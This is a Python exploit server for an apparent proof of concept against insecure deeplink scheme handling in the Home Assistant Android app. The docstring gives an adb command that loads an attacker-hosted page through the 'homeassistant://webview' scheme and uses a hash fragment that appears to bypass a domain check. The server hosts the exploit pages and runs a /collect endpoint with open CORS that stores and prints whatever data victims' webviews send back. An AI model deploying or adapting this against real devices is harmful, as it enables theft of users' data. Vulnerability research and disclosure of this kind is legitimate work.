"""
2.3.2_Insecure_System_Scheme_Handling - EXP Server
Deeplink: adb shell am start -a android.intent.action.VIEW -d 'homeassistant://webview?url=http://<ip>:8000/exp/2.3.2_Insecure_System_Scheme_Handling.html%23home-assistant.io'
"""
import http.server, json, urllib.parse, os
PORT = 8000
D = os.path.join(os.path.dirname(__file__), "received")
os.makedirs(D, exist_ok=True)

class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        if p.path.startswith("/exp/"):
            fp = os.path.join(os.path.dirname(__file__), "exp", os.path.basename(p.path))
            if os.path.exists(fp):
                self.send_response(200); self.send_header("Content-Type", "text/html"); self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers()
                with open(fp, "rb") as f: self.wfile.write(f.read()); return
            self.send_error(404); return
        if p.path == "/collect":
            self.send_response(200); self.send_header("Content-Type", "application/json"); self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers()
            q = urllib.parse.parse_qs(p.query); d = q.get("d", [""])[0]
            ts = str(int(os.times().elapsed * 1000))
            with open(os.path.join(D, f"collected_{ts}.txt"), "w") as f: f.write(d)
            print(f"[+] {d[:100]}"); self.wfile.write(json.dumps({"status": "ok"}).encode()); return
        super().do_GET()
    def do_POST(self):
        cl = int(self.headers.get("Content-Length", 0)); body = self.rfile.read(cl) if cl > 0 else b""
        if self.path == "/collect":
            self.send_response(200); self.send_header("Content-Type", "application/json"); self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers()
            ts = str(int(os.times().elapsed * 1000))
            with open(os.path.join(D, f"collected_{ts}.txt"), "wb") as f: f.write(body)
            print(f"[+] POST {ts}"); self.wfile.write(json.dumps({"status": "ok"}).encode()); return
        self.send_error(405)
    def do_OPTIONS(self):
        self.send_response(200); self.send_header("Access-Control-Allow-Origin", "*"); self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS"); self.send_header("Access-Control-Allow-Headers", "*"); self.end_headers()
    def log_message(self, fmt, *args): print(f"[{self.client_address[0]}] {fmt % args}")

if __name__ == "__main__":
    print(f"[*] 2.3.2_Insecure_System_Scheme_Handling on :{PORT}")
    s = http.server.HTTPServer(("0.0.0.0", PORT), H)
    try: s.serve_forever()
    except KeyboardInterrupt: print("\n[*] Done"); s.shutdown()
